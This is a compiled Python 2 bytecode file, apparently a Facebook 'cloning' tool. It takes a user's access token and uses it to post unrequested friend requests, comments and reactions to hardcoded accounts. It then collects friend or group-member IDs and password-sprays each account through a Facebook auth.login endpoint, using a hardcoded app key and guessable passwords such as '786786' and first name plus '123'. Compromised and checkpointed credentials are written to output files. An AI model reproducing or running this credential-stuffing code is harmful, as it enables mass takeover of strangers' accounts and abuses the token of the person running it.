ó
T7`c           @   sg  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d d& g e _ d' g e _ d( g e _ d) g e _ d* g e _ d+ g e _ d, g e _ d- g e _ d. g e _ d/ g e _ d0 g e _ d1 g e _ d2 g e _ d   Z d   Z d   Z d   Z d Z d   Z  d Z! g  Z" g  a# g  a$ g  Z% g  Z& d Z' d Z( d   Z) d    Z* d!   Z+ d"   Z, d#   Z- d$   Z. e/ d% k rce)   n  d S(3   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-Agents   Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36sR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16sh   Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Geckoss   Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36s¾   Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69sÍ   Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537sÉ   Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]s°   Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70sù   Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FBsd   Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36sw   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36sg   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36sk   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36c           C   s   d GHt  j j   d  S(   Ns   [1;91mExit(   t   ost   syst   exit(    (    (    s   /sdcard/9.pyt   keluar   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/9.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   /sdcard/9.pyR   (   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/9.pyt   jalan3   s    s(  
[1;94m ######   #######  ##     ## #### 
[1;92m##    ## ##     ## ###   ###  ##  
[1;96m##       ##     ## #### ####  ##  
 [1;92m######  ##     ## ## ### ##  ##  
[1;91m      ## ##     ## ##     ##  ##  
[1;94m##    ## ##     ## ##     ##  ##  
[1;93m ######   #######  ##     ## #### 

c       z   C   s«  d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d d gz }  x0 |  D]( } d | Gt  j j   t j d  q{Wd  S(   Ns   [|]s   [/]s   [-]s   [\]s   [[1;32mâ[0m]
s-   [1;91m[â] [1;92mLoa[1;90mding.. [1;97mg¹?(   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/9.pyt   tikC   s    ÿ ui    s   [31mNot Vulns	   [32mVulnc          C   sñ   t  j d  t GHd d GHt d  d d GHt d  d d GHHt d  }  yr t j d |   } t j | j	  } | d } t
 d	 d
  } | j |   | j   d GHt  j d  t   Wn* t k
 rì d GHt j d  t   n Xd  S(   Nt   cleari/   s   [1;97m=sD   [1;91m[1;33m             â   CLONING TOOL   â           [1;0ms?   [1;91m.                   ENTER[1;94m FACEBOOK [1;93mTOKEN!!s/   [1;97m{[1;91m?[1;97m} Token [1;91m:[1;97m s+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s8   [1;97m{[1;92m![1;97m}[1;92m Login Success ! [Enjoy] s@   xdg-open https://www.facebook.com/profile.php?id=100041349421055s-   [1;97m{[1;91m![1;97m} [1;91mToken wrong !g333333û?(   R   t   systemt   logoR!   t	   raw_inputt   requestst   gett   jsont   loadst   textt   openR   t   closet	   bot_koment   KeyErrorR   R   t   login(   t   tokett   otwt   at   namat   zedd(    (    s   /sdcard/9.pyR3   W   s.    	
	
	

c          C   s  y t  d d  j   }  Wn# t k
 r> d GHt j d  n Xd } d } d } d } d } d	 } d
 } t j d | d |   t j d | d | d |   t j d | d | d |   t j d | d | d |   t j d | d | d |   t   d  S(   Ns	   login.txtt   rs   [0;39m[!] Token invalids   rm -rf login.txtt   100024540287354s	   BRAND BOYt   BROKENt   1050418732088069s   DASHING BOYt   LOVEs7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s   https://graph.facebook.com/s   /comments/?message=s   /reactions?type=(   R/   t   readt   IOErrorR   R'   R*   t   postt   menu(   R4   t   unat   komt   reacR@   t   post2t   kom2t   reac2(    (    s   /sdcard/9.pyR1   q   s$    !!!!c          C   sj  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xy= t j	 d |   } t
 j | j  } | d } | d	 } Wnm t k
 rð t  j d  d
 GHt  j d  t j d  t   n* t j j k
 rd GHt   t   n Xt  j d  t GHd | GHd | GHd | d GHd GHd GHd GHd GHt   d  S(   NR%   s	   login.txtR9   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=R&   t   ids=   [1;96m[!] [1;91mIt seems that your account has a checkpoints1   [1;96m[!] [1;91mThere is no internet connectionsC   [1;37m{[1;36mâ¢[1;37m}[1;33m Name Account[1;33m     :[1;36m s@   [1;37m{[1;36mâ¢[1;37m}[1;32m User ID[1;33m       :[1;36m s@   [1;37m{[1;36mâ¢[1;37m}[1;36m Date of birth[1;33m :[1;36m t   birthdays   [1;34mâââââââââââââââââââââââââââââââââââââââââââs6   [1;37m{[1;33m01[1;37m}[1;37m[1;37m Start Crackings.   [1;37m{[1;31m00[1;37m}[1;37m[1;37m Logout(   R   R'   R/   R>   R?   R   R   R3   R*   R+   R,   R-   R.   R2   t
   exceptionsR   R   t   perbaruiR(   t   pilih(   R4   R5   R6   R7   RH   (    (    s   /sdcard/9.pyRA      sD    

		c          C   sz   t  d  }  |  d k r' d GHt   nO |  d k r= t   n9 |  d k rj t d  t j d  t   n d GHt   d  S(	   Ns   [1;33mPilih [1;31m:[1;37m R
   s:   [1;97m{[1;91m![1;97m}[1;97m Content That Is True Dear!t   1t   0s   Token Removeds   rm -rf login.txts<   [1;97m{[1;91m![1;97m}[1;97m The contents are true dear !(   R)   RL   t   superR!   R   R'   R   (   t   unikers(    (    s   /sdcard/9.pyRL   ®   s    



c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR%   s	   login.txtR9   s   [1;97mToken invalids   rm -rf login.txti   s5   [1;91m[[1;92m1[1;91m][1;96m Crack your Friendlists8   [1;91m[[1;92m2[1;91m][1;93m Crack id link Friendlists7   [1;91m[[1;92m3[1;91m][1;94m Crack From member groups/   [1;91m[[1;92m4[1;91m][1;91m Crack your Files-   [1;91m[[1;92m0[1;91m][1;91m Close program(   R   R'   R/   R>   R4   R?   R   R   R3   R(   t   pilih_super(    (    (    s   /sdcard/9.pyRO   ¾   s     c          C   sú  t  d  }  |  d k r' d GHt   nk|  d k r t j d  t GHt d  t j d t  } t	 j
 | j  } x¹| d D] } t j | d	  q Wn|  d
 k rt j d  t GHd d GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r7d GHt  d  t   n Xt j d | d t  } t	 j
 | j  } xÈ| d D] } t j | d	  qpWn¢|  d k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  }	 d |	 d GHWn' t k
 rd GHt  d  t   n Xt d  t j d | d t  }
 t	 j
 |
 j  } xÖ | d D] } t j | d	  qbWn° |  d k rt j d  t GHyC t  d  } x0 t | d   j   D] } t j | j    qÃWWq0t k
 r
d! GHt  d  t   q0Xn" |  d" k r$t   n d GHt   d# t t t   GHd$ d% d& g } x0 | D]( } d' | Gt j j   t j d(  q[WHd d GHHd)   } t d*  } | j | t  d+ GHd, t t t   d- t t t    GHt  d.  t   d  S(/   Ns   
[1;97m>>>[1;97mR
   s   [1;97mFill in correctlyRM   R%   s$   [1;97m[ð¶] Getting IDs [1;97m...s3   https://graph.facebook.com/me/friends?access_token=t   dataRH   t   2i/   s   [1;97m=s8   [1;97m[[1;92m+[1;97m][1;92m Enter ID[1;37m: [1;97ms   https://graph.facebook.com/s   ?access_token=s6   [1;97m[[1;92mâ[1;97m][1;96m Name[1;97m:[1;95m R&   s   [1;91mID Not Found!s   
[1;97m[[1;91mBack[1;97m]s   /friends?access_token=t   3sG   [1;91m[1;97m[[1;92m,+[1;97m] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s2   [1;91m[âº] [1;92mGet group member id [1;97m...s9   /members?fields=name,id&limit=9999999999999&access_token=t   4s@   [1;91m[1;97m[[1;92m+[1;97m] [1;92mFile ID  [1;91m: [1;97mR9   s   [1;91m[!] File not foundRN   s>   [1;97m[[1;92m+[1;97m][1;94m Total Friends [1;96m: [1;97ms   .   s   ..  s   ... s9   [1;97m[[1;92mâ[1;97m] [1;91mCloning Started[1;97mi   c         S   sm  |  } y t  j d  Wn t k
 r* n Xy4t j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rñ t j d | d	 | d  } t j | j  } d
 | d | GHt j | |  nmd | d k rXd | d | GHt d d  }	 |	 j | d | d  |	 j   t j | |  nd }
 t	 j
 d | d |
 d  } t j |  } d | k rît j d | d	 | d  } t j | j  } d
 | d |
 GHt j | |
  npd | d k rUd | d |
 GHt d d  }	 |	 j | d |
 d  |	 j   t j | |
  n	| d d } t	 j
 d | d | d  } t j |  } d | k rót j d | d	 | d  } t j | j  } d
 | d | GHt j | |  nkd | d k rZd | d | GHt d d  }	 |	 j | d | d  |	 j   t j | |  n| d d } t	 j
 d | d | d  } t j |  } d | k røt j d | d	 | d  } t j | j  } d
 | d | GHt j | |  nfd | d k r_d | d | GHt d d  }	 |	 j | d | d  |	 j   t j | |  nÿ| d d } t	 j
 d | d | d  } t j |  } d | k rýt j d | d	 | d  } t j | j  } d
 | d | GHt j | |  nad | d k rdd | d | GHt d d  }	 |	 j | d | d  |	 j   t j | |  núd } t	 j
 d | d | d  } t j |  } d | k rút j d | d	 | d  } t j | j  } d
 | d | GHt j | |  ndd | d k rad | d | GHt d d  }	 |	 j | d | d  |	 j   t j | |  ný d } t	 j
 d | d | d  } t j |  } d | k r÷t j d | d	 | d  } t j | j  } d
 | d | GHt j | |  ng d | d k r^d | d | GHt d d  }	 |	 j | d | d  |	 j   t j | |  n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t   786786s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens   ?access_token=s%   [1;32m[OK][1;32m [1;32mâ¬[1;32m s    [1;32mâ¬[1;32m s   www.facebook.comt	   error_msgs&   [1;97m[CP+][1;97m [1;92mâ¬[1;97m s    [1;92mâ¬[1;97m s   out/checkpoint.txtR6   t   |s   
t   Pakistant
   first_namet   786t   123s   out/Checkpoint.txtt   12345t   000786t   Pakistan123(   R   t   mkdirt   OSErrorR*   R+   R4   R,   R-   R.   t   urllibt   urlopent   loadt   okst   appendR/   R   R0   t   cekpoint(   t   argt   userR6   R   t   pass1RR   t   qR   R   t   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(    (    s   /sdcard/9.pyt   main&  sØ    






i2   s"   [1;96mProcess Has Been Completed.s*   [1;92mTotal OK/[1;97mCP [1;97m: [1;92ms   [1;97m/[1;97ms   
[1;93m[[1;96mBack[1;93m](!   R)   RQ   R   R'   R(   R!   R*   R+   R4   R,   R-   R.   RH   Rh   R2   RO   t   fb_tokenRb   R/   t	   readlinest   stripRA   R   R   R   R   R   R   R   R    t   mapRg   Ri   (   t   peakR9   R   t   st   idtt   jokt   opR   t   idgt   aswt   ret   pt   idlistt   lineR"   R#   Ru   (    (    s   /sdcard/9.pyRQ   Ó   s    

	




		u)
t   __main__(   s
   User-Agents   Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   User-Agentsh   Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko(   s
   User-Agentss   Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36(   s
   User-Agents¾   Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69(   s
   User-AgentsÍ   Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537(   s
   User-AgentsÉ   Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;](   s
   User-Agents°   Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70(   s
   User-Agentsù   Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB(   s
   User-Agentsd   Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36(   s
   User-Agentsw   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36(   s
   User-Agentsg   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36(   s
   User-Agentsk   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36(0   R   R   R   t   datetimeR   t   hashlibR   t	   threadingR,   Rd   t	   cookielibR*   t	   mechanizet   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R!   R(   R$   t   backt   berhasilRi   Rg   RH   t   listgrupt   vulnott   vulnR3   R1   RA   RL   RO   RQ   t   __name__(    (    (    s   /sdcard/9.pyt   <module>   sV   
						
			&			Ñ


	/sdcard/9.py